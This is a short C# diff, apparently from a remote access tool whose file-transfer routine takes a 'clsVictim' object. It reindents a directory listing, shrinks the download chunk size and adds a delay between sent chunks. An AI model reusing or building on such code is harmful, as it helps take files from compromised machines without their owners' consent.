@@ -98,14 +98,14 @@ namespace winClient48
                     DirectoryInfo info = new DirectoryInfo(dir);
                     l_dir.Add(new string[]
                     {
-                            dir, //DIR NAME
-                            "X", //FILE LENGTH
-                            "X", //READABLE, WRITABLE
-                            //(is_readonly ? "R" : string.Empty) + (is_writable ? "W" : string.Empty),
-                            info.Attributes.ToString(), //FOLDER ATTRIBUTE
-                            info.CreationTime.ToString("F"), //FOLDER CREATION TIME
-                            info.LastWriteTime.ToString("F"), //LAST WRITE TIME
-                            info.LastAccessTime.ToString("F"), //LAST ACCESS TIME
+                        dir, //DIR NAME
+                        "X", //FILE LENGTH
+                        "X", //READABLE, WRITABLE
+                        //(is_readonly ? "R" : string.Empty) + (is_writable ? "W" : string.Empty),
+                        info.Attributes.ToString(), //FOLDER ATTRIBUTE
+                        info.CreationTime.ToString("F"), //FOLDER CREATION TIME
+                        info.LastWriteTime.ToString("F"), //LAST WRITE TIME
+                        info.LastAccessTime.ToString("F"), //LAST ACCESS TIME
                     });
 
                     if (dir_limit == -1)
@@ -248,7 +248,7 @@ namespace winClient48
         }
         public void Download(string[] files, clsVictim v)
         {
-            int chunk_size = 1024 * 5;
+            int chunk_size = 1024 * 3;
             byte[] file_buffer = new byte[chunk_size];
 
             g_bDownloadPause = false;
@@ -300,6 +300,8 @@ namespace winClient48
 
                         v.SendCommand(szPayload);
                         i++;
+
+                        Thread.Sleep(10);
                     }
                 }
             }
